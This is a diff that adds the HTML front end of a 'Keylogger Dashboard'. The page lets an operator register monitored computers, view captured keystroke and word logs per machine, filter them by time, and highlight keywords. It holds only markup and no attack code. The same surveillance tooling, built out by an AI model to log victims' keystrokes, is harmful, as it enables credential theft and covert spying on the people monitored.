@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger Dashboard</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@400;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
+    
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/themes/dark.css">
+</head>
+<body>
+    <div id="login-container" class="form-container">
+        <h1>Authorized Access Required</h1>
+        <form id="login-form">
+            <div class="input-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" placeholder="User Credential" class="styled-input" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" placeholder="Authentication Key" class="styled-input" required>
+            </div>
+            <button type="submit" id="login-button"><span class="material-symbols-outlined">login</span> Login</button>
+        </form>
+        <p>Don't have an account?</p>
+        <button id="show-signup" class="toggle-button">Sign Up</button>
+    </div>
+    
+    <div id="signup-container" class="form-container" style="display: none;">
+        <h1>Create an Account</h1>
+        <form id="signup-form">
+            <div class="input-group">
+                <label for="new-username">User ID:</label>
+                <input type="text" id="new-username" name="new-username" placeholder="9-digit User ID" class="styled-input" required>
+            </div>
+            <div class="input-group">
+                <label for="new-password">Password:</label>
+                <input type="password" id="new-password" name="new-password" placeholder="Min. 8 characters" class="styled-input" required>
+            </div>
+            <button type="submit" id="signup-button"><span class="material-symbols-outlined">person_add</span> Sign Up</button>
+        </form>
+        <p>Already have an account?</p>
+        <button id="show-login" class="toggle-button">Login</button>
+    </div>
+    
+    <div id="dashboard-container" style="display: none;">
+        <div class="header-actions">
+            <h1>Keylogger Dashboard</h1>
+            <div class="header-buttons">
+                <button id="add-computer-button" class="back-button"><span class="material-symbols-outlined">add_circle</span> Add Computer</button>
+                <button id="logout-button" class="back-button"><span class="material-symbols-outlined">logout</span> Logout</button>
+            </div>
+        </div>
+
+        <div class="summary-cards">
+            <div class="summary-card">
+                <h3>Total Computers</h3>
+                <p id="total-computers">0</p>
+            </div>
+            <div class="summary-card">
+                <h3>Total Keystrokes</h3>
+                <p id="total-keystrokes">0</p>
+            </div>
+        </div>
+
+        <div class="search-container">
+            <input type="text" id="search-input" placeholder="Search computers..." class="styled-input">
+            <span class="search-icon"><span class="material-symbols-outlined">search</span></span>
+        </div>
+        
+        <div id="computer-grid">
+        </div>
+    </div>
+
+    <div id="keystroke-viewer" style="display: none;">
+        <div class="viewer-header">
+            <h2><span class="material-symbols-outlined">keyboard</span> Keystroke Log</h2>
+            <h3>for <span id="computer-name"></span></h3>
+        </div>
+        <div class="search-container">
+            <label for="keystroke-search-input" class="search-label">Filter Keystroke Log</label>
+            <input type="text" id="keystroke-search-input" placeholder="Type a key or phrase..." class="styled-input">
+            <span class="search-icon"><span class="material-symbols-outlined">search</span></span>
+        </div>
+        
+        <div class="info-panel">
+            <div>Last Connected: <span id="last-connected"></span></div>
+        </div>
+
+        <div class="filter-group">
+            <label>Filter by Date/Time</label>
+            <div class="date-filter">
+                <div class="input-group">
+                    <label for="start-time-input">Start:</label>
+                    <input type="datetime-local" id="start-time-input" class="styled-input">
+                </div>
+                <div class="input-group">
+                    <label for="end-time-input">End:</label>
+                    <input type="datetime-local" id="end-time-input" class="styled-input">
+                </div>
+            </div>
+        </div>
+        
+        <div class="card log-card">
+          <h2>Keystrokes Log</h2>
+          <ul id="keystroke-log" class="log-container">
+          </ul>
+        </div>
+
+        <div class="card log-card">
+          <h2>Words Log</h2>
+          <div id="word-log" class="word-log-container">
+          </div>
+        </div>
+
+        <div class="keyword-container">
+            <h4>Keyword Highlighting</h4>
+            <div class="input-group-inline">
+                <input type="text" id="keyword-input" placeholder="Add keyword..." class="styled-input">
+                <button id="add-keyword-button" class="add-button"><span class="material-symbols-outlined">add</span> Add</button>
+            </div>
+            <div id="keyword-list" class="tag-list">
+            </div>
+        </div>
+        <button id="back-button" class="back-button"><span class="material-symbols-outlined">arrow_back</span> Back to Dashboard</button>
+    </div>
+    
+    <script src="/static/script.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+</body>
+</html>
